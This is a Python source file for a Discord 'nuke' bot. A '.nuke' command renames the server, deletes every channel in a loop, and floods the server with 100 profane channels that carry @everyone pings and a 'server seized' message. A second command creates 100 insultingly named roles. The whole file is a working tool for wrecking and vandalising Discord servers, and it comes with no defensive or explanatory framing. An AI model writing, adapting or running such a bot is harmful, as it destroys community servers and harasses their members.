import discord
import os
from discord.ext import commands, tasks
import asyncio
from keep_alive import keep_alive

keep_alive()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

my_secret = os.environ['TOKEN']

@tasks.loop(seconds=30)  # Increase the time interval between loops
async def nuke_channels(guild):
    try:
        for channel in guild.channels:
            await channel.delete()
            await asyncio.sleep(0.2)  # Adding a small delay between channel deletions

        for i in range(1, 101):
            channel_name = f"fuckedbyotc-{i}"
            new_channel = await guild.create_text_channel(channel_name)
            await new_channel.send("@everyone")
            await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY CITY-31'S OVERWATCH TACTICAL CONTROL.")
            await new_channel.send("https://i.ibb.co/8BqScCN/Overwatch-Tactical-Control0.png")
            await asyncio.sleep(0.1)  # Adding a delay between channel creations
    except discord.Forbidden:
        print("Missing permissions to perform channel operations.")
    except Exception as e:
        print(f"An error occurred: {e}")

@bot.command()
async def nuke(ctx):
    await ctx.send("Initiating nuke...")

    # Changing the server name to "GET FUCKED"
    if len(bot.guilds) > 0:
        try:
            guild = bot.guilds[0]  # Change the first available guild name
            await guild.edit(name="SEIZED BY OTC")

            nuke_channels.start(guild)  # Start the channel nuke process
        except discord.Forbidden:
            await ctx.send("Bot doesn't have the necessary permissions to change the server name.")
    else:
        await ctx.send('No guilds available')

@nuke_channels.before_loop
async def before_nuke_channels():
    await bot.wait_until_ready()

@bot.command()
async def CreateRoles(ctx):
    guild = ctx.guild
    for i in range(100):
        await guild.create_role(name="Bitch")
    await ctx.send("CHECK YOUR ROLES")

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=".nuke"))
    print(f'Logged in as {bot.user.name}')
    print('------')


bot.run(my_secret) # Runs the bot
